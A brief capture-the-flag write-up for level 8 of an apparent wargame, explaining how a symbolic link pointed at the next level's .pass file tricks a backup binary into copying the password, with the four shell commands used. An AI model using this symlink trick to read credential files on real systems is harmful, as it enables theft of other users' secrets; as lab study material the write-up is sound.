For this level, we have a x64 binary, who ask for one parameters (a file) to read.
And we have a folder named "backups" with a .log file in it (we can run it but its useless)
When we pass a file, he will wrote the process in the .log, and if it succeed,
he will copy the file in backups/.

So, we can just put a symbolic link to the .pass of the level 9, pass the link
to the bin, and we have the flag in the backups folder.

level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s /home/users/level09/.pass toto
level08@OverRide:~$ ./level08 toto
level08@OverRide:~$ cat backups/toto
